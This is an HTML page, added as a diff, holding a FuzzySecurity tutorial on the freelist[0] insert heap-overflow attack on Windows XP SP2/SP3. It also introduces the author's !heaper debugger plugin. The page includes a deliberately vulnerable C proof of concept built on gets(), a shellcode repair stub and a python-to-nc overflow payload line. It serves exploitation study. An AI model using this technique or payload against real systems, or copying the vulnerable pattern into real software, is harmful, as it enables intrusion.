@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Heap Overflows For Humans 102.5</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPython.js"></script>
+    <script type="text/javascript" src="../../js/shBrushCpp.js"></script>
+    <script type="text/javascript" src="../../js/shBrushJScript.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Heap Overflows For Humans 102.5</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Heap Overflows For Humans 102.5<span class="line"></span></h2>
+        <p>Hi folks. Sometime ago, I discussed an old, but important technique for exploiting application specific heap overflows under windows XP SP3. Today, I am going to discuss another important technique  and give a small introduction to my immunity debugger plug-in tool called <a href="https://github.com/net-ninja/heaper">!heaper</a>!<br /><br />
+
+First off, I would like to thank some serious researchers for the previous research done in this area as one can only appreciate the technical complexities/difficulties in understanding these concepts, without these people, these articles wouldn't exist.<br /><br />
+
+So a BIG thank you to Brett Moore, Nicolas Waisman and Chris Valasek. Your research is beyond exceptional.<br /><br />
+
+Ok lets begin?<br /><br />
+
+In December 2005 Brett Moore released some very interesting research 'Exploiting Freelist[0] On XP SP2'. It details two very useful techniques independently discovered by Mr Moore that could be used to attack Freelist[0]. We are going to cover one particular technique known as the 'freelist[0] insert' attack simply due to its practicality.<br /><br />
+
+<span style="color: #ffffff;"><strong>You will need to setup a machine with:</strong></span><br /><br />
+
+- Windows XP with just SP2/SP3 installed<br />
+- <a href="http://www.immunityinc.com/" target="_blank">Immunity Debugger</a><br />
+- <a href="http://sourceforge.net/projects/pyparsing/">pyparser</a><br />
+- <a href="http://www.graphviz.org/Download.php">graphviz</a><br />
+- A copy of my immunity debugger plugin <a href="https://github.com/net-ninja/heaper">heaper.py</a>
+- A c/c++ compiler (<a href="http://prdownloads.sourceforge.net/dev-cpp/devcpp-4.9.9.2_setup.exe" target="_blank">Dev C++</a>, <a href="http://www.cs.virginia.edu/~lcc-win32/" target="_blank">lcc-32</a>, MS visual C++ 6.0 (if you can still get it)).<br />
+- A scripting language of ease (I use <a href="http://www.python.org/ftp/python/2.7/python-2.7.msi" target="_blank">python</a>, maybe you can 
+use <a href="http://www.activestate.com/activeperl" target="_blank">perl</a>).<br />
+- A <a href="http://lmgtfy.com/?q=a+brain" target="_blank">brain</a> (and/or persistence).<br />
+- Some knowledge of <a href="http://www.plantation-productions.com/Webster/www.artofasm.com/Windows/HTML/AoATOC.html" target="_blank">Assembly</a>, C and knowledge on how to dig through a debugger using HideDbg (plugin) for Olly or !hidedebug under immunity debugger.</p>
+
+      <div class="fourteen columns bottom">
+      <h2 class="title">Freelist[0] Insert Attack<span class="line"></span></h2>
+      <p>The concept to this attack works by overwriting the blink in a freelist[0] chunk and when inserting a chunk before the overwritten chunk, the blink is not checked before the inserted flink/blink pointers are updated. Safe unlinking applies only to the chunk being manipulated and its relevant blink/flink (no validation on chunks being relinked).<br /><br />
+
+To mitigate this issue, under windows 7 using dedicated Freelists, Microsoft implemented a check similar to this small snippet of pseudo code:</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre>if (chunk[blink] -> PrevChunk && PrevChunk[flink] -> chunk)
+        proceed()</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>If chunks before and after have their backward and forward links validated, then it would of course mitigate the issue and not allow an attacker to set an arbitrary pointer or set an arbitrary value pointed to by an uncontrolled address. Below is the crude code example we will work with:</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: c;gutter:false;auto-links: false;;">
+/*
+    exploiting freelist[0] (insert)
+    technique by Brett Moore
+    poc example by Steven Seeley
+*/
+
+#include &lt;stdio.h>
+#include &lt;windows.h>
+int main(int argc,char *argv[])
+{
+    char *a,*b,*c,*x,*y,*z;
+    long *hHeap;
+
+    hHeap = HeapCreate(0x00040000,0,0);
+    a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,1200);
+    b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,1024);
+    c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,2048);
+
+    // freelist[0] has 'c' chunk
+    HeapFree(hHeap, 0, c);
+
+    // overwrite b so that we spill into c
+    // set c's blink to lookaside[3]
+
+    printf("(+) Chunk b: 0x%08x\n",b);
+    printf("(+) Fill chunk b (using 1024 bytes), overflowing chunk c:\n");
+
+    // overflow b
+    // using 1024 A's + BBBBCCCCDDDDEEEE (E=blink) (D=Flink)
+    // overflow with blink set to 0x00480718 (lookaside[3])
+
+    gets(b);
+
+    // free 'a' so that freelist[0] looks like this:
+    // freelist[0]:
+    //             chunk b
+    //             chunk a
+    //             chunk c
+
+    // the 'insert'
+    HeapFree(hHeap, 0, a);
+
+    // now lookaside[3] should be
+    // lookaside[3]:
+    //              chunk b
+    //              chunk a
+    //                    chunk ?        (fake chunk created from the overwrite)
+    //              flink we control from overwrite
+
+    // pop off the lookaside until we reach
+    // our fake chunk
+
+    x = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+    y = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+    z = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
+
+    // write shellcode at controlled freelist flink (lookaside fake chunk)
+    gets(z);
+    exit(0);
+}</pre>
+</div>
+
+<p>Whilst this code, of course, does not represent any kind of real world example, once the concept is grasped, the technique may be applied to an application specific situation.<br /><br />
+
+Compile the code or grab the per-compiled version [b33f: Executable not available] if you open it up in a debugger this is what you should see:</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_1.png"><p>&nbsp;</p>
+
+<p>Now scroll down until you see the main API calls used in the application HeapCreate, HeapAlloc, HeapFree and set breakpoints on second HeapFree and the following HeapAllocs after that.</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_2.png"><p>&nbsp;</p>
+
+<p>Now we have to hide the fact that we are running this under the debugger so we use '!hidedebug all_debug' to patch all API's.</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_3.png"><p>&nbsp;</p>
+
+<p>Ok, run the application and you should get requested to insert some junk into the cmd window. Because this is STDIN, we cannot simply insert binary data into the application. To help illustrate further, we will insert ASCII data and modify it in memory so that a more complete understanding is gained.<br /><br />
+
+If the astute reader is paying attention, you will have noticed that the chunk we are writing into is 1024 bytes in length. Any number of bytes past this point will overflow the buffer, therefore precise control is needed. If we overflow with 8 bytes (for the header of the next chunk) and another 8 bytes (for flink/blink) then we can use this to take complete control. Lets generate our ASCII quickly:</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_4.png"><p>&nbsp;</p>
+
+<p>Ok so we paste this into the application and hit the first breakpoint (Call on HeapFree):</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_6.png"><p>&nbsp;</p>
+
+<p>Now lets do some analysis and find out what is happening. First, lets look at the freelist and visually inspect its layout by using !heaper ab -g.</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_lookatfl.png"><p>&nbsp;</p>
+
+<p>We can also get this information visually using '!heaper ab 490000 -g'. You can find the graph located in 'C:\Program Files\Immunity Inc\Immunity Debugger\' (the default filename in this case would be 'freelist_graph.png').</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_lookatfl1.png"><p>&nbsp;</p>
+
+<p>Right, so we can pretty clearly see that blink/flink are overwritten with our controlled data. The idea now is that we have to modify the blink '0x44444444' to the lookaside[3] entry address. At this stage, the lookaside doesn't exist as no entries have been freed to the lookaside yet but we are going to fake some entries. Lets change the value:</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_7.png"><p>&nbsp;</p>
+
+<p>As we can see, the freelist[0] entry now reflects this change:</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_8.png"><p>&nbsp;</p>
+
+<p>Ok so this is the important part, if we step over the HeapFree() call we can see a big change. The lookaside[3] is populated with 3 entries and our controlled flink becomes the flink of a fake chunk on the lookaside. Use '!heaper af [heap]' or '!heaper analysefrontend [heap]' to return the following output.</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_10.png"><p>&nbsp;</p>
+
+<p>Once again, visually using '!heaper af 490000 -g'. The default filename here would be 'lal_graph.png', you can chose a custom name using -f</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_11.png"><p>&nbsp;</p>
+
+<p>If we continue execution until the next call to HeapAlloc() we can see that the flink is getting returned from each entry in the lookaside list.</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_13.png"><p>&nbsp;</p>
+
+<p>Of course 0x43434343 is not a valid chunk and we must update the flink so that it can be read at and written too. In this case, we are going to use the PEB FastPEBLockRoutine pointer as described in Heap Overflows for Humans 102 to accomplish this. The PEB is of course randomized now, however I am simply demonstrating how the technique works since we need a valid pointer to write too. You can use '!heaper dp -m' to dump the PEB's management structure and find the offset to FastPEBLockRoutine (although it is always 0x20 of the PEB).</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_21.png"><p>&nbsp;</p>
+
+<p>Next, lets patch the 0x43434343 located at the lookaside[3]  entry:</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_19.png"><p>&nbsp;</p>
+
+<p>Simply let the execution continue and the chunk can be read and written to. Lets recap:<br /><br />
+
+<pre>
+<span class="fire icon color"></span> We now have created the situation perfectly to write 'data/shellcode' to any 4 bytes in memory.
+<span class="fire icon color"></span> A call from RtlAcquirePebLock+0x28 to FastPEBLockRoutine() is attempted. Seeing as RtlAcquirePebLock() is using the current PEB to find
+        the pointer and call it, it calls our shellcode instead.</pre><br /><br />
+
+See below:</p>
+
+<p>&nbsp;</p><img src="images/fl_insert_23.png"><p>&nbsp;</p>
+
+<p>At this point, shellcode execution is quite straight forward, a pivot into executing code from EAX would be needed and the stage 1 shellcode should be a stub that repairs of the pointer that we just overwrote. Below is a small stub that will do this.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre>.386
+.model flat, stdcall
+option casemap:none
+
+.code
+start:
+mov eax, 7c901deh ; ntdll.RtlEnterCriticalSection
+mov ecx, 7ffdf01ch ; offset in the PEB 0x1f (yours will be different)
+add ecx, 4h
+mov dword ptr ds:[ecx],eax
+
+end start</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>So essentially this translates to something like this:</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre>00401000 > $ B8 DE55F777    MOV EAX,ntdll.RtlEnterCriticalSection
+00401005   . B9 1CF0FD7F    MOV ECX,7FFDF01C
+0040100A   . 83C1 04        ADD ECX,4
+0040100D   . 8901           MOV DWORD PTR DS:[ECX],EAX</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>This way, the pointer will be restored and shellcode will not keep executing. Under windows XP sp3, this of course should be done dynamically if the PEB base address was brute forced. Ill let the astute reader fix the above assembly stub to dynamically located the PEB and patch the offset 0x20. You could use fs:[0x30].<br /><br />
+
+A re-cap of data we would actually send the next time we want to exploit the application in one shot (assuming we are sending the data over a socket connection):</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre>python -c "\x41" * 1024 + "\x42" * 8 + "\x20\xf0\xfd\x7f" + "\x18\x07\x49" | nc -v &lt;target> &lt;ip></pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>The NULL byte would of course be appended to the end of the string.<br /><br />
+
+<span style="color: #ffffff;"><strong>Limitations and Requirements:</strong></span><br /><br />
+
+<pre>
+<span class="fire icon color"></span> You need to know the overflowed heap base address. Not as easy as one might think, however a information leak will help a lot with this.
+<span class="fire icon color"></span> You need to be able to predetermine the PEB base address or at least use another function pointer that you can overwrite that will get called. This
+        will be explained further soon.
+<span class="fire icon color"></span> You need to have controlled allocation sizes.
+<span class="fire icon color"></span> You need to be able to cause the application to free a chunk that is smaller than the overwritten chunk yet bigger than the chunk we filled. This may
+        happen without any determinism, however controlling allocation sizes and controlling when a chunk is freed is a sure way of making progress.</pre></p>
+        
+<h2 class="title">Heaper<span class="line"></span></h2>
+<p>During my time in attempting to understand the techniques used in heap exploitation, I often needed to visualize aspects of memory and so I primarily used Immunity Debugger (windbg's !heap is insane though). However I was unable to find tools within immunity debugger that analyzed and determined the exploitability of the heap. Given that Immunity Debugger was an 'exploit' focused debugger, I decided to get to work on an immunity debugger plugin that helps to not only visualize heap structures, but also to determine the exploitability by using a number of heuristics.<br /><br />
+
+Currently, the plugin does not do any heuristics check to determine the exploitability of a given heap overflow, however it will be integrated in the near future. Currently the tool checks for simple write4 flink/blink overwrites and will detect if the size field has been overwritten in the chunks header. However it is likely that depending on how the heap overflow is triggered, that a valid exploitable path will be given to the user. Windows 7 will be supported in the coming months as I do more analysis on its exploitability and conditional circumstances.<br /><br />
+
+Ensure that you have pydot, pyparser and graphviz installed and save the code into Immunity's pycommands directory 'C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands\' you can bring up the help functionality by typing !heaper.</p>
+
+<p>&nbsp;</p><img src="images/heaper.png"><p>&nbsp;</p>
+
+<p>I mentioned previously that the task of finding function pointers to overwrite is often difficult. On top of that, we need to make sure the pointer we chose will get triggered after our overflow. Let !heaper's features help solve this problem.<br /><br />
+
+Using !heaper you can dump all function pointers in the .data section by simply using '!heaper dumpfunctionpointers' or '!heaper dfp'.</p>
+
+<p>&nbsp;</p><img src="images/dfp.png"><p>&nbsp;</p>
+
+<p>To patch a single function pointer with the default value 0x41414141 use '!heaper dfp -p &lt;function pointer>' or patch all of them using, '!heaper dfp -p all'.</p>
+
+<p>&nbsp;</p><img src="images/dfp_patch.png"><p>&nbsp;</p>
+
+<p>We can also restore the function pointers by using -r all or &lt;function pointer>.</p>
+
+<p>&nbsp;</p><img src="images/dfp_patch1.png"><p>&nbsp;</p>
+
+<p>Restoring the patched example above:</p>
+
+<p>&nbsp;</p><img src="images/dfp_restore.png"><p>&nbsp;</p>
+
+<p>So the idea here is to patch all the function pointers and let the application run (simulating a write4 condition) and wait for a look up and call to one of them. If an access violation is triggered, you can find the pointer address on the stack.<br /><br />
+
+Many other functions exist so I invite the reader to investigate and explore the possibilities of the tool; and provide me with some feedback and ideas of what you would like to see. Some suggestions I recieved include:<br /><br />
+
+<pre>
+<span class="fire icon color"></span> Provide some hooking functionality for certain heap calls VirtuallAlloc, HeapAlloc, HeapFree, HeapCreate etc and display the arguments (if
+        possible display the return value)
+<span class="fire icon color"></span> Provide some stats regarding heap sprays, such as number of blocks sprayed, size of each block, offset into the block that the spray
+        starts etc.
+<span class="fire icon color"></span> Provide Windows 7 functionality for the LFH and ensure graphing functionality will work.
+<span class="fire icon color"></span> Create and ensure the heuristics to determine exploitability are highly accurate. Heuristics for the following 4 attacks to begin with:
+        bitmap flipping, freelist[0] insert, freelist[0] search and overwriting a chunk of the lookaside</pre><br /><br />
+
+As you can see there is still much to be done, but I hope this gets some people off the ground for heap exploitation.</p>
+
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
